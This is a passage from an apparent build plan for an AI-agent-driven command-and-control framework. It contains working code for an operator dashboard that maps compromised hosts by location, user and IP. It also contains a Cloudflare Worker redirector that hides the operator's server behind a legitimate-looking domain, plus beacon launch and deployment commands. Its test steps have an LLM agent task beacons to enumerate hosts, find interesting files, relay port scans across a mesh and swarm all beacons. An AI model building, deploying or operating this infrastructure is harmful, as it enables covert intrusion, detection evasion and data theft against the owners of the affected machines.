│   └── c2_dash_web.ex
├── assets/
│   ├── css/
│   │   └── dashboard.css
│   └── js/
│       └── hooks/
│           ├── world_map.js       # Leaflet.js map hook
│           └── heatmap.js         # D3/canvas heatmap hook
└── priv/
    └── static/
        └── geo/
            └── GeoLite2-City.mmdb # MaxMind GeoIP database
```

### 7.3 `lib/c2_dash/poller.ex`

Polls the controller's internal API every 2 seconds. Broadcasts changes via PubSub.

```elixir
defmodule C2Dash.Poller do
  use GenServer

  @poll_interval 2_000

  defmodule State do
    defstruct api_url: nil,
              beacons: [],
              results: [],
              stats: %{},
              geo_cache: %{}   # %{ip => %{lat, lng, country, city}}
  end

  def start_link(opts) do
    GenServer.start_link(__MODULE__, opts, name: __MODULE__)
  end

  def get_state do
    GenServer.call(__MODULE__, :get_state)
  end

  @impl true
  def init(opts) do
    api_url = Keyword.get(opts, :api_url, "http://127.0.0.1:8444")
    schedule_poll()
    {:ok, %State{api_url: api_url}}
  end

  @impl true
  def handle_info(:poll, state) do
    state = poll_controller(state)
    schedule_poll()
    {:noreply, state}
  end

  @impl true
  def handle_call(:get_state, _from, state) do
    {:reply, state, state}
  end

  defp poll_controller(state) do
    with {:ok, beacons_resp} <- http_get("#{state.api_url}/beacons"),
         {:ok, results_resp} <- http_get("#{state.api_url}/results"),
         {:ok, stats_resp} <- http_get("#{state.api_url}/stats") do

      beacons = beacons_resp["beacons"] || []
      results = results_resp["results"] || []

      # GeoIP enrich beacons
      {enriched_beacons, geo_cache} = enrich_with_geo(beacons, state.geo_cache)

      new_state = %{state |
        beacons: enriched_beacons,
        results: results,
        stats: stats_resp,
        geo_cache: geo_cache
      }

      C2Dash.PubSub.broadcast_update()
      new_state
    else
      _ -> state  # silently retry on failure
    end
  end

  defp enrich_with_geo(beacons, cache) do
    Enum.map_reduce(beacons, cache, fn beacon, acc ->
      ip = beacon["ip"]
      case Map.get(acc, ip) do
        nil ->
          geo = C2Dash.Geo.lookup(ip)
          {Map.put(beacon, "geo", geo), Map.put(acc, ip, geo)}
        cached ->
          {Map.put(beacon, "geo", cached), acc}
      end
    end)
  end

  defp http_get(url) do
    case Req.get(url, receive_timeout: 5_000) do
      {:ok, %{status: 200, body: body}} -> {:ok, body}
      other -> {:error, other}
    end
  end

  defp schedule_poll do
    Process.send_after(self(), :poll, @poll_interval)
  end
end
```

### 7.4 `lib/c2_dash/geo.ex`

GeoIP lookup using MaxMind's GeoLite2 database via the `geolix` library.

```elixir
defmodule C2Dash.Geo do
  @doc """
  Look up IP geolocation. Returns %{lat, lng, country, city} or nil.
  Uses the bundled GeoLite2-City.mmdb.
  """
  def lookup(nil), do: nil
  def lookup(ip_string) do
    case Geolix.lookup(ip_string, where: :city) do
      %{location: %{latitude: lat, longitude: lng}, country: %{iso_code: cc},
        city: %{name: city}} ->
        %{lat: lat, lng: lng, country: cc, city: city || "Unknown"}
      _ ->
        # Private/unknown IPs — try to infer from subnet
        nil
    end
  end
end
```

### 7.5 `lib/c2_dash_web/live/dashboard_live.ex`

Main dashboard. Four panels: metric cards, world map, activity heatmap, beacon/result tables.

```elixir
defmodule C2DashWeb.DashboardLive do
  use C2DashWeb, :live_view

  @impl true
  def mount(_params, _session, socket) do
    if connected?(socket) do
      C2Dash.PubSub.subscribe()
      schedule_tick()
    end

    state = C2Dash.Poller.get_state()
    payload = C2Dash.Presenter.build(state)

    {:ok, assign(socket, payload: payload, now: DateTime.utc_now())}
  end

  @impl true
  def handle_info(:mesh_updated, socket) do
    state = C2Dash.Poller.get_state()
    payload = C2Dash.Presenter.build(state)
    {:noreply, assign(socket, payload: payload)}
  end

  @impl true
  def handle_info(:tick, socket) do
    schedule_tick()
    {:noreply, assign(socket, now: DateTime.utc_now())}
  end

  @impl true
  def render(assigns) do
    ~H"""
    <div class="dashboard">
      <header class="hero">
        <h1>C2 Mesh — Operations</h1>
        <span class={"status-indicator #{if @payload.any_alive, do: "live", else: "dark"}"}>
          <%= if @payload.any_alive, do: "LIVE", else: "NO BEACONS" %>
        </span>
      </header>

      <!-- Metric Cards -->
      <div class="metric-grid">
        <.metric_card label="Active" value={@payload.stats.alive} class="success" />
        <.metric_card label="Dead" value={@payload.stats.dead} class="danger" />
        <.metric_card label="Queued Tasks" value={@payload.stats.pending} class="warning" />
        <.metric_card label="Results" value={@payload.stats.total_results} class="info" />
      </div>

      <!-- World Map -->
      <section class="panel map-panel">
        <h2>Beacon Locations</h2>
        <div id="world-map"
             phx-hook="WorldMap"
             phx-update="ignore"
             data-beacons={Jason.encode!(@payload.map_markers)}>
        </div>
      </section>

      <!-- Activity Heatmap -->
      <section class="panel">
        <h2>Activity (last 24h)</h2>
        <div id="activity-heatmap"
             phx-hook="ActivityHeatmap"
             phx-update="ignore"
             data-activity={Jason.encode!(@payload.activity_data)}>
        </div>
      </section>

      <!-- Beacon Table -->
      <section class="panel">
        <h2>Beacons</h2>
        <table>
          <thead>
            <tr>
              <th>ID</th><th>Host</th><th>User</th><th>IP</th>
              <th>Location</th><th>Status</th><th>Last Seen</th><th>Queue</th>
            </tr>
          </thead>
          <tbody>
            <%= for b <- @payload.beacons do %>
              <tr class={unless b.alive, do: "row-dead"}>
                <td class="mono"><%= b.beacon_id %></td>
                <td><%= b.hostname %></td>
                <td><%= b.username %></td>
                <td class="mono"><%= b.ip %></td>
                <td>
                  <%= if b.geo do %>
                    <span class="flag"><%= country_flag(b.geo.country) %></span>
                    <%= b.geo.city %>
                  <% else %>
                    <span class="dim">local</span>
                  <% end %>
                </td>
                <td><span class={"badge #{badge_class(b)}"}><%= status_text(b) %></span></td>
                <td><%= relative_time(b.last_checkin, @now) %></td>
                <td><%= b.queue_depth %></td>
              </tr>
            <% end %>
          </tbody>
        </table>
      </section>

      <!-- Recent Results Feed -->
      <section class="panel">
        <h2>Recent Results</h2>
        <div class="result-feed">
          <%= for r <- Enum.take(@payload.results, 20) do %>
            <div class="result-entry">
              <div class="result-header">
                <span class="mono"><%= r["beaconId"] %></span>
                <span class={"badge #{result_badge(r["status"])}"}><%= r["status"] %></span>
                <span class="dim"><%= r["taskId"] %></span>
                <span class="dim"><%= relative_time(r["timestamp"], @now) %></span>
              </div>
              <pre class="result-output"><%= truncate(r["output"], 300) %></pre>
            </div>
          <% end %>
        </div>
      </section>
    </div>
    """
  end

  # -- Components --

  defp metric_card(assigns) do
    ~H"""
    <div class={"metric-card metric-#{@class}"}>
      <div class="metric-value"><%= @value %></div>
      <div class="metric-label"><%= @label %></div>
    </div>
    """
  end

  # -- Helpers --

  defp schedule_tick, do: Process.send_after(self(), :tick, 1_000)

  defp badge_class(%{alive: true, missed_count: m}) when m > 2, do: "badge-warning"
  defp badge_class(%{alive: true}), do: "badge-active"
  defp badge_class(_), do: "badge-danger"

  defp status_text(%{alive: true, missed_count: m}) when m > 2, do: "SLOW"
  defp status_text(%{alive: true}), do: "ALIVE"
  defp status_text(_), do: "DEAD"

  defp result_badge("finished"), do: "badge-active"
  defp result_badge("errored"), do: "badge-danger"
  defp result_badge(_), do: "badge-warning"

  defp relative_time(nil, _), do: "never"
  defp relative_time(dt_string, now) when is_binary(dt_string) do
    case DateTime.from_iso8601(dt_string) do
      {:ok, dt, _} -> relative_time_diff(DateTime.diff(now, dt, :second))
      _ -> dt_string
    end
  end
  defp relative_time(%DateTime{} = dt, now), do: relative_time_diff(DateTime.diff(now, dt, :second))

  defp relative_time_diff(d) when d < 5, do: "just now"
  defp relative_time_diff(d) when d < 60, do: "#{d}s ago"
  defp relative_time_diff(d) when d < 3600, do: "#{div(d, 60)}m ago"
  defp relative_time_diff(d), do: "#{div(d, 3600)}h ago"

  defp country_flag(nil), do: ""
  defp country_flag(cc) when byte_size(cc) == 2 do
    cc
    |> String.upcase()
    |> String.to_charlist()
    |> Enum.map(&(&1 - ?A + 0x1F1E6))
    |> List.to_string()
  end
  defp country_flag(_), do: ""

  defp truncate(nil, _), do: ""
  defp truncate(s, max) when byte_size(s) <= max, do: s
  defp truncate(s, max), do: String.slice(s, 0, max) <> "..."
end
```

### 7.6 `assets/js/hooks/world_map.js`

Leaflet.js hook for the beacon world map. LiveView pushes marker data, the hook
renders pins with popups.

```javascript
import L from "leaflet";

export const WorldMap = {
  mounted() {
    this.map = L.map(this.el, {
      center: [20, 0],
      zoom: 2,
      zoomControl: true,
      attributionControl: false,
    });

    // Dark tile layer (matches C2 aesthetic)
    L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
      maxZoom: 18,
    }).addTo(this.map);

    this.markers = L.layerGroup().addTo(this.map);
    this.renderMarkers();

    // Re-render when LiveView pushes new data
    this.handleEvent("update_markers", ({ beacons }) => {
      this.el.dataset.beacons = JSON.stringify(beacons);
      this.renderMarkers();
    });
  },

  updated() {
    this.renderMarkers();
  },

  renderMarkers() {
    this.markers.clearLayers();
    const beacons = JSON.parse(this.el.dataset.beacons || "[]");

    beacons.forEach((b) => {
      if (!b.lat || !b.lng) return;

      const color = b.alive ? "#00ff88" : "#ff4444";
      const marker = L.circleMarker([b.lat, b.lng], {
        radius: 8,
        fillColor: color,
        fillOpacity: 0.8,
        color: color,
        weight: 2,
      });

      marker.bindPopup(`
        <b>${b.beacon_id}</b><br>
        ${b.hostname} (${b.username})<br>
        ${b.ip}<br>
        ${b.city}, ${b.country}<br>
        Status: ${b.alive ? "ALIVE" : "DEAD"}
      `);

      this.markers.addLayer(marker);
    });
  },
};
```

### 7.7 `assets/js/hooks/heatmap.js`

Activity heatmap — time (x-axis, last 24h in hour buckets) × beacon (y-axis),
color intensity = number of task results in that hour.

```javascript
export const ActivityHeatmap = {
  mounted() {
    this.canvas = document.createElement("canvas");
    this.canvas.width = this.el.clientWidth;
    this.canvas.height = 200;
    this.el.appendChild(this.canvas);
    this.render();
  },

  updated() {
    this.render();
  },

  render() {
    const data = JSON.parse(this.el.dataset.activity || "{}");
    // data shape: { beaconIds: [...], hours: [0..23], grid: [[count, ...], ...] }

    const ctx = this.canvas.getContext("2d");
    const w = this.canvas.width;
    const h = this.canvas.height;
    ctx.clearRect(0, 0, w, h);

    const beacons = data.beaconIds || [];
    const hours = data.hours || [];
    const grid = data.grid || [];

    if (beacons.length === 0) {
      ctx.fillStyle = "#666";
      ctx.font = "14px monospace";
      ctx.fillText("No activity data", w / 2 - 60, h / 2);
      return;
    }

    const cellW = Math.floor((w - 100) / 24);
    const cellH = Math.floor((h - 30) / beacons.length);
    const maxVal = Math.max(1, ...grid.flat());

    // Draw cells
    grid.forEach((row, bi) => {
      row.forEach((val, hi) => {
        const intensity = val / maxVal;
        const r = Math.floor(intensity * 255);
        const g = Math.floor(intensity * 100);
        ctx.fillStyle = val === 0 ? "#1a1a2e" : `rgb(${r}, ${g}, 50)`;
        ctx.fillRect(100 + hi * cellW, bi * cellH, cellW - 1, cellH - 1);
      });

      // Beacon label
      ctx.fillStyle = "#aaa";
      ctx.font = "11px monospace";
      ctx.fillText(beacons[bi].slice(0, 12), 2, bi * cellH + cellH - 4);
    });

    // Hour labels
    ctx.fillStyle = "#666";
    ctx.font = "10px monospace";
    for (let i = 0; i < 24; i += 3) {
      ctx.fillText(`${i}h`, 100 + i * cellW, h - 5);
    }
  },
};
```

### 7.8 `lib/c2_dash/presenter.ex`

Transforms poller state into dashboard-ready payload including map markers
and heatmap grid data.

```elixir
defmodule C2Dash.Presenter do
  def build(state) do
    beacons = Enum.map(state.beacons, fn b ->
      %{
        beacon_id: b["beaconId"],
        hostname: b["hostname"],
        username: b["username"],
        ip: b["ip"],
        os: b["os"],
        alive: b["alive"],
        last_checkin: b["lastCheckin"],
        missed_count: b["missedCount"] || 0,
        queue_depth: b["queueDepth"] || 0,
        geo: b["geo"]
      }
    end)

    alive_count = Enum.count(beacons, & &1.alive)

    # Map markers — only beacons with geo data
    map_markers = beacons
      |> Enum.filter(& &1.geo)
      |> Enum.map(fn b ->
        %{
          beacon_id: b.beacon_id,
          hostname: b.hostname,
          username: b.username,
          ip: b.ip,
          alive: b.alive,
          lat: b.geo.lat,
          lng: b.geo.lng,
          city: b.geo.city,
          country: b.geo.country
        }
      end)

    # Activity heatmap — 24h × beacon grid
    activity_data = build_activity_heatmap(beacons, state.results)

    %{
      beacons: beacons,
      results: state.results,
      map_markers: map_markers,
      activity_data: activity_data,
      any_alive: alive_count > 0,
      stats: %{
        alive: alive_count,
        dead: length(beacons) - alive_count,
        pending: state.stats["pendingTasks"] || 0,
        total_results: state.stats["totalResults"] || 0
      }
    }
  end

  defp build_activity_heatmap(beacons, results) do
    now = DateTime.utc_now()
    beacon_ids = Enum.map(beacons, & &1.beacon_id)

    # Build 24-hour buckets for each beacon
    grid = Enum.map(beacon_ids, fn bid ->
      bid_results = Enum.filter(results, &(&1["beaconId"] == bid))
      Enum.map(0..23, fn hour_offset ->
        cutoff_start = DateTime.add(now, -(hour_offset + 1) * 3600, :second)
        cutoff_end = DateTime.add(now, -hour_offset * 3600, :second)

        Enum.count(bid_results, fn r ->
          case DateTime.from_iso8601(r["timestamp"] || "") do
            {:ok, ts, _} ->
              DateTime.compare(ts, cutoff_start) != :lt and
              DateTime.compare(ts, cutoff_end) == :lt
            _ -> false
          end
        end)
      end)
      |> Enum.reverse()  # oldest hour first
    end)

    %{beaconIds: beacon_ids, hours: Enum.to_list(0..23), grid: grid}
  end
end
```

### 7.9 `mix.exs` Dependencies

```elixir
defp deps do
  [
    {:phoenix, "~> 1.8"},
    {:phoenix_live_view, "~> 1.1"},
    {:phoenix_html, "~> 4.2"},
    {:bandit, "~> 1.8"},
    {:jason, "~> 1.4"},
    {:req, "~> 0.5"},
    {:geolix_adapter_mmdb2, "~> 0.6"},
    {:geolix, "~> 2.0"},
    {:esbuild, "~> 0.8", runtime: Mix.env() == :dev},
    {:tailwind, "~> 0.2", runtime: Mix.env() == :dev}
  ]
end
```

### 7.10 Running the Dashboard

```bash
# 1. Controller must be running with internal API enabled
#    (Start-C2Controller now also calls Start-C2InternalApi)

# 2. Start the Phoenix dashboard
cd c2-dashboard/
mix deps.get
mix phx.server
# → Dashboard at http://localhost:4000/dashboard

# 3. Open browser alongside the PshAgent operator CLI
#    Dashboard shows live beacon map, heatmap, status table, result feed
```

---

## 8. Phase 6: Cloudflare Redirector

### Purpose

Beacons on the internet can't call back to the operator's IP directly. A Cloudflare
Worker sits in front of the controller as a redirector — beacons talk to
`tasks.legit-domain.com` which proxies to the real C2 server.

```
Beacon → HTTPS → Cloudflare CDN (tasks.legit-domain.com)
                      │
                Cloudflare Worker
                      │
                      ▼
              PowerShell Controller (origin)
```

### Benefits

- **Domain fronting**: beacon traffic looks like normal HTTPS to a CDN domain
- **IP hiding**: the operator's real IP is behind Cloudflare
- **TLS termination**: Cloudflare handles certs, no self-signed issues
- **Geographic distribution**: Cloudflare edge nodes worldwide
- **Rate limiting / WAF**: additional protection for the C2 server

### 8.1 Cloudflare Worker (`worker.js`)

Minimal pass-through proxy. Forwards `/register` and `/checkin` to the origin.

```javascript
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // Only proxy C2 routes
    if (path !== '/register' && path !== '/checkin') {
      // Return a plausible 404 for anything else
      return new Response('Not Found', { status: 404 });
    }

    // Forward to origin
    const originUrl = `${env.C2_ORIGIN}${path}`;

    const originRequest = new Request(originUrl, {
      method: request.method,
      headers: {
        'Content-Type': request.headers.get('Content-Type') || 'application/octet-stream',
        'User-Agent': request.headers.get('User-Agent') || '',
        'X-Forwarded-For': request.headers.get('CF-Connecting-IP') || '',
      },
      body: request.method === 'POST' ? request.body : undefined,
    });

    try {
      const response = await fetch(originRequest);
      return new Response(response.body, {
        status: response.status,
        headers: {
          'Content-Type': response.headers.get('Content-Type') || 'application/octet-stream',
        },
      });
    } catch (err) {
      // Return generic error — don't leak origin info
      return new Response('Service Unavailable', { status: 503 });
    }
  },
};
```

### 8.2 `wrangler.toml`

```toml
name = "c2-redirector"
main = "worker.js"
compatibility_date = "2024-01-01"

[vars]
C2_ORIGIN = "https://your-origin-server:8443"

# Custom domain (set up in Cloudflare DNS)
# routes = [{ pattern = "tasks.your-domain.com/*", zone_name = "your-domain.com" }]
```

### 8.3 Beacon Configuration for Cloudflare

Update `c2-config.ps1` to support redirector URL:

```powershell
# In c2-config.ps1, add:
$script:C2Config += @{
    # Cloudflare redirector (beacons use this instead of direct origin)
    RedirectorUrl    = $null   # e.g., 'https://tasks.legit-domain.com'
    # If set, beacons call RedirectorUrl. If null, they call ControllerUrl directly.
}
```

The beacon's `Register-Beacon` and `Invoke-CheckIn` already take a `$ControllerUrl`
parameter — just pass the Cloudflare URL instead of the direct origin:

```powershell
# Direct (lab):
./start-beacon.ps1 -ControllerUrl 'https://10.0.0.1:8443' -Key $key

# Via Cloudflare (production):
./start-beacon.ps1 -ControllerUrl 'https://tasks.legit-domain.com' -Key $key
```

No code changes needed — the encryption layer means Cloudflare can't read the
payloads, it just proxies opaque blobs.

### 8.4 Deployment Steps

```bash
# 1. Set up domain in Cloudflare DNS
#    A record: tasks.your-domain.com → (Cloudflare proxy enabled, orange cloud)

# 2. Deploy worker
cd c2-redirector/
npx wrangler secret put C2_ORIGIN  # paste your origin URL
npx wrangler deploy

# 3. Set custom route (Cloudflare dashboard or wrangler)
npx wrangler route add 'tasks.your-domain.com/*' c2-redirector

# 4. Start controller on origin server
./c2-mesh/Launchers/start-controller.ps1 -Key $key

# 5. Start beacons pointing at Cloudflare domain
./start-beacon.ps1 -ControllerUrl 'https://tasks.your-domain.com' -Key $key
```

---

## 9. Verification Steps

### Phase 1: Foundation

```powershell
# Test crypto round-trip
Import-Module ./c2-mesh/c2-mesh.psd1 -Force
$key = New-C2Key
$encrypted = Invoke-C2Encrypt -Plaintext 'hello world' -Key $key
$decrypted = Invoke-C2Decrypt -CipherText $encrypted -Key $key
# Assert: $decrypted -eq 'hello world'

# Test with JSON payload
$payload = @{ beaconId = 'test'; data = 'some data' } | ConvertTo-Json
$enc = Invoke-C2Encrypt -Plaintext $payload -Key $key
$dec = Invoke-C2Decrypt -CipherText $enc -Key $key
# Assert: ($dec | ConvertFrom-Json).beaconId -eq 'test'
```

### Phase 2: Controller

```powershell
# Start controller in a separate pwsh session
Import-Module ./PshAgent/PshAgent.psd1 -Force
Import-Module ./c2-mesh/c2-mesh.psd1 -Force

$key = New-C2Key
$stores = Get-BeaconRegistry

# Start listener
$listener = Start-C2Listener -Port 8443 -Key $key `
    -Registry $stores.Registry `
    -TaskQueues $stores.TaskQueues `
    -ResultStore $stores.ResultStore

# Simulate beacon registration
$regPayload = @{ beaconId = 'test-1'; hostname = 'TESTPC'; username = 'admin'; os = 'Windows'; ip = '10.0.1.5'; pid = 1234 }
$encrypted = Invoke-C2Encrypt -Plaintext ($regPayload | ConvertTo-Json -Compress) -Key $key
# POST to https://localhost:8443/register (use Invoke-WebRequest or HttpClient)

# Verify registration
$stores.Registry['test-1']  # Should show the beacon entry

# Queue a task
Send-BeaconTask -BeaconId 'test-1' -Task 'Enumerate this host' -TaskQueues $stores.TaskQueues

# Simulate check-in
$checkinPayload = @{ beaconId = 'test-1'; results = @() }
# POST to /checkin — response should contain the queued task

# Clean up
Stop-C2Listener -ListenerState $listener
```

### Phase 3: Beacon Core

```powershell
# Terminal 1: Start controller
./c2-mesh/Launchers/start-controller.ps1
# Note the generated key

# Terminal 2: Start beacon
./c2-mesh/Launchers/start-beacon.ps1 -ControllerUrl 'https://localhost:8443' -Key '<key>'

# In Terminal 1 (operator CLI):
# > list beacons
# > task beacon-xxx to enumerate the host and find interesting files
# > get results from beacon-xxx

# Verify:
# - Beacon registers and appears in list_beacons
# - Tasks are delivered on check-in
# - Results flow back to controller
# - Kill signal terminates the beacon
```

### Phase 4: Mesh

```powershell
# Start controller on host A
./c2-mesh/Launchers/start-controller.ps1

# Start beacon on host A (can reach B but controller can't)
# Start beacon on host B

# From operator:
# > task beacon-A to discover mesh peers
# > task beacon-A to relay port_scan task to peer at 10.0.1.10
# > swarm all beacons to enumerate their hosts

# Verify:
# - mesh_discover finds peer beacons
# - mesh_relay successfully forwards tasks
# - swarm_task reaches all beacons
```

---

## 10. PshAgent API Reference

Quick reference of the PshAgent APIs used throughout this implementation.

### `New-Tool` — `PshAgent/Public/New-Tool.ps1`

```powershell
New-Tool -Name <string> -Description <string> -Parameters <hashtable> -Execute <scriptblock>
# Returns: [PshAgentTool]
# Parameters hashtable = JSON Schema: @{ type='object'; properties=@{...}; required=@(...) }
# Execute receives: param($a) where $a is a hashtable of arguments
```

### `New-Hook` — `PshAgent/Public/New-Hook.ps1`

```powershell
New-Hook -Name <string> -EventType <AgentEventType> -Fn <scriptblock>
# Returns: [PshAgentHook]
# Fn receives: param($event) where $event is an AgentEvent subclass
# Return $null to continue, or a [Reaction] to control flow
```

### `New-Agent` — `PshAgent/Public/New-Agent.ps1`

```powershell
New-Agent -Generator <PshGenerator> [-Name <string>] [-SystemPrompt <string>]
          [-Toolkit <PshAgentToolkit>] [-Tools <PshAgentTool[]>]
          [-StopCondition <StopCondition>] [-MaxSteps <int>]
          [-Hooks <PshAgentHook[]>] [-GenerateOptions <hashtable>]
# Returns: [PshAgent]
```

### `Invoke-Agent` — `PshAgent/Public/Invoke-Agent.ps1`

```powershell
Invoke-Agent -Agent <PshAgent> -Prompt <string> [-Trajectory <Trajectory>]
# Returns: @{ Status=[AgentStatus]; Output=[string]; Steps=[int]; Usage=[Usage]; Trajectory=[Trajectory]; Error=[string] }
```

### `Start-PshAgent` — `PshAgent/Public/Start-PshAgent.ps1`

```powershell
Start-PshAgent [-ConnectionString <string>] [-SystemPrompt <string>]
               [-Tools <PshAgentTool[]>] [-Hooks <PshAgentHook[]>]
               [-StopCondition <StopCondition>] [-MaxSteps <int>] [-Compact]
# Interactive REPL — blocks until /quit
```

### `New-SubAgentTool` — `PshAgent/Public/New-SubAgentTool.ps1`

```powershell
New-SubAgentTool -Name <string> -Description <string> -ConnectionString <string>
                 -SystemPrompt <string> [-Tools <PshAgentTool[]>]
                 [-BuiltinTools <string[]>] [-ToolModules <string[]>]
                 [-MaxSteps <int>] [-OutOfProcess]
# Returns: [PshAgentTool] that delegates to a child agent
```

### `PshGenerator` — `PshAgent/Classes/Generator.ps1`

```powershell
$gen = [PshGenerator]::new('anthropic/claude-sonnet-4-20250514')
$gen = [PshGenerator]::new('openai/gpt-4o', @{ temperature = 0.7 })
$result = $gen.Generate([Message[]]$messages, [hashtable]$options)
# $result = @{ Message=[Message]; Usage=[Usage]; StopReason=[string] }
```

### `Reaction` — `PshAgent/Classes/Reaction.ps1`

```powershell
[Reaction]::Continue()                        # Priority 2 — no action
[Reaction]::Retry()                           # Priority 3 — retry generation
[Reaction]::RetryWithFeedback('message')      # Priority 3 — retry with user message
[Reaction]::Fail('reason')                    # Priority 4 — fail agent
[Reaction]::Finish()                          # Priority 5 — finish agent (highest)
```

### `AgentEventType` enum — `PshAgent/Classes/Types.ps1`

```
AgentStart, AgentEnd, AgentStalled, AgentError
GenerationStart, GenerationEnd, GenerationStep, GenerationError
ToolStart, ToolEnd, ToolStep, ToolError
ReactStep
```

### `StopCondition` — `PshAgent/Classes/StopCondition.ps1`

```powershell
$cond = [StopCondition]::new('name', { param($steps) $steps.Count -ge 10 })
$cond = New-StepCountCondition -MaxSteps 10
$combined = $cond1.And($cond2)   # both must be true
$combined = $cond1.Or($cond2)    # either true
$inverted = $cond.Not()
```
